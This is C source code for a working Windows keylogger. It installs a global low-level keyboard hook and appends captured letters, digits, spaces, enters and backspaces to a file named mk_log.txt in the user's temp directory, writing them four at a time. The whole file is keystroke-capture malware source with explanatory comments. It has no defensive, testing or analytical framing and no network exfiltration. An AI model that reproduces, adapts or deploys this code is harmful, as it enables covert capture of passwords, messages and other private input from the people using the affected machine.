#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <WinUser.h>

char keyBuffer[4];                                                                              // Array to buffer keys to optimize performance
int keyBufferCounter = 0;                                                                       // Counter to keep track of the keybuffer size
char *pfullFilePath;                                                                            // Path to the log file

LRESULT CALLBACK KeyPressHookProc(int, WPARAM, LPARAM);                                         // Declare the custom hook callback
char InterpretVKCode(DWORD);                                                                    // Interprets the visual key code
void WriteKeyStrokes(char);                                                                     // Buffers and then writes the input to a log file
void InitializeLogFile();                                                                       // Setting up the log file
void CleanUpThenFatalDie();                                                                     // Helper function

int main()
{
    InitializeLogFile();                                                                        // Initializing the log file in temp dir

    HHOOK hhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, KeyPressHookProc, NULL, 0);       // Install the hook
    if (hhkLowLevelKybd == NULL)                                                                // Check for successful installation of the hook
    {
        printf("Failed to install hook!\n");
        exit(1);
    }

    MSG msg;                                                                                    // Declare the message
    while (GetMessage(&msg, NULL, 0, 0))                                                        // Run the message loop to keep the hook active
    {                                                     
        TranslateMessage(&msg);                                                                 // Process the message
        DispatchMessage(&msg);                                                                  // Process the message
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);                                                       // Uninstall the hook before exiting
    free(pfullFilePath);                                                                        // Cleaning up allocated memory
    exit(0);                                                                                    // Exit program with success
}


LRESULT CALLBACK KeyPressHookProc(int nCode, WPARAM wParam, LPARAM lParam)                      // Keypress hook proc definiton
{                    
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;                                 // Assigning keyboard state
        char key = InterpretVKCode(pKeyBoard->vkCode);                                          // Turning vkcode into the actual representation
        if (key != '\0')
        {
            printf("Key: %c\n", key);
            WriteKeyStrokes(key);                                                               // Writing pressed key to log file
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);                                         // Exiting the curerent hook call
}

char InterpretVKCode(DWORD vkCode)
{
    if (vkCode >= 0x30 && vkCode <= 0x39)                                                       // Numeric keys (0-9)
    {
        return '0' + (vkCode - 0x30);
    }
    else if (vkCode >= 0x41 && vkCode <= 0x5A)                                                  // Alphabetic keys (a-z)
    {
        return 'a' + (vkCode - 0x41);
    }
    else if (vkCode == VK_SPACE)                                                                // Space key
    {
        return ' ';
    }
    else if (vkCode == VK_RETURN)                                                               // Enter key
    {
        return '\n';
    }
    else if (vkCode == VK_BACK)                                                                 // Backspace key
    {
        return '<';
    }

    return '\0';                                                                                // Default case for unsupported keys
}

void WriteKeyStrokes(char keyVal)
{
    if (keyBufferCounter == 4)                                                                  // Check if keybuffer reached it's limit
    {
        FILE *pLogFile;
        pLogFile = fopen(pfullFilePath, "a");                                                   // Open log file to get handle 
        if(pLogFile == NULL)
        {
            fprintf(stderr, "Could not open log file in tmp dir");
            CleanUpThenFatalDie();
        }
        
        fwrite(keyBuffer, sizeof(char), keyBufferCounter, pLogFile);                            // Write buffered values into file
        fclose(pLogFile);                                                                       // Closing file stream
        memset(keyBuffer, 0, sizeof(keyBuffer));                                                // Zero-ing out keybuffer (resetting it) 
        keyBufferCounter = 0;                                                                   // Resetting the key buffer counter
    }

    keyBuffer[keyBufferCounter] = keyVal;                                                       // Write pressed char into buffer
    keyBufferCounter++;                                                                         // Increment the buffer counter
}

void InitializeLogFile()
{
    char tempPath[MAX_PATH];                                                                    // Declare var that holds temp path
    char fileName[11] = "mk_log.txt";                                                           // Declare file name of log

    DWORD tempPathLen = GetTempPathA(MAX_PATH, tempPath);                                       // Retrieve path to the temp folder
    if (tempPathLen == 0)                                                                       // Check if temp path was retrieved correcty
    {
        puts("Temp path couldn't be determined");
        exit(1);
    }

    if ((pfullFilePath = malloc(strlen(tempPath) + strlen(fileName) + 1)) != NULL)              // Allocates buffer on heap and checks if successful
    {
        pfullFilePath[0] = '\0';                                                                // Zero-ing out first byte of heap allocated buffer
        strcat(pfullFilePath, tempPath);                                                        // Appends the temp dir path to the buffer
        strcat(pfullFilePath, fileName);                                                        // Appends the file name to the temp dir in buffer
        memset(keyBuffer, 0, sizeof(keyBuffer));                                                // Zero-ing out keybuffer as initialization
        printf("%s\n", pfullFilePath);                                                          // Log for debugging
    }
    else
    {
        fprintf(stderr, "Failed to allocate the string for the full path");                     // Error handling for failed allocation
        exit(1);
    }
}

void CleanUpThenFatalDie()                                                                      // Helper function to clean up and exit with error
{
    if(pfullFilePath != NULL)
    {
        free(pfullFilePath);                                                                    // Frees the allocated memory
    }
    exit(1);
}
